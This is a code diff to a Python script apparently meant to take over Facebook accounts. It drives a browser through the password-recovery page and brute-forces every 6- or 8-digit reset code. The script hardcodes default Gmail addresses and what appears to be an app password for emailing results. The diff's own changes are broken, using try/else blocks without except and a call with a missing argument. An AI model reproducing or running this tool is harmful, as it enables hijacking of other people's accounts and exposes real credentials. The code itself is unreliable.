@@ -37,6 +37,7 @@ def sleepy(counter):
 def fb_hack(email, codex, respect):
   os.system('clear')
   soup = BeautifulSoup()
+  cursor.hide()
   options = webdriver.ChromeOptions()
   options.add_argument("--no-sandbox")
   options.add_argument("--disable-dev-shm-usage")
@@ -45,28 +46,49 @@ def fb_hack(email, codex, respect):
   driver.get("https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l")
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
-  search_box = driver.find_element(by = By.ID, value = "identify_email")
-  search_box.send_keys(email)
-  search_box.send_keys(Keys.ENTER)
-  sleep(2)
-  search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
-  search_button.click()
-  sleep(2)
-  search_button = driver.find_element(by = By.NAME, value = "reset_action")
-  search_button.click()
-  sleep(2)
+  try:
+    search_box = driver.find_element(by = By.ID, value = "identify_email")
+    search_box.send_keys(email)
+    search_box.send_keys(Keys.ENTER)
+    sleep(2)
+  else:
+    sleep(2)
+    driver.save_screenshot("fail1.png")
+    print("Failed at email")
+    cursor.show()
+  try:
+    search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
+    search_button.click()
+    sleep(2)
+  else:
+    sleep(2)
+    driver.save_screenshot("fail2.png")
+    print("Failed at try another way")
+    cursor.show()
+  try:
+    search_button = driver.find_element(by = By.NAME, value = "reset_action")
+    search_button.click()
+    sleep(2)
+  else:
+    sleep(2)
+    driver.save_screenshot("fail3.png")
+    print("Failed at reset action")
+    cursor.show()
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   if sixdigits != test:
+    print(sixdigits)
     respect = int(6)
   else:
+    print(eightdigits)
     respect = int(8)
   for combination in itertools.product(range(10), repeat=int(respect)):
     p = (''.join(map(str, combination)))
     counter += 1
     if counter <= codex:
+      cursor.hide()
       print("working", end='\r')
     else:
       try:
@@ -98,6 +120,7 @@ def fb_hack(email, codex, respect):
         respect = 0
         break
       sleepy(30)
+  cursor.show()
   past = int(respect)
   return past
 
@@ -108,10 +131,9 @@ past = int(input('Length: ') or 6)
 sender_email = input("Your Email:") or "krarktel@gmail.com"
 receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
 password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
-while past >= 6:
-  fb_hack(ehack, reset, past)
-  past += 1
-  past = 1
+while past != 0:
+  fb_hack(ehack, reset)
+
 
 subject = "An email with attachment from Python"
 body = "This is an email with attachment sent from Python"
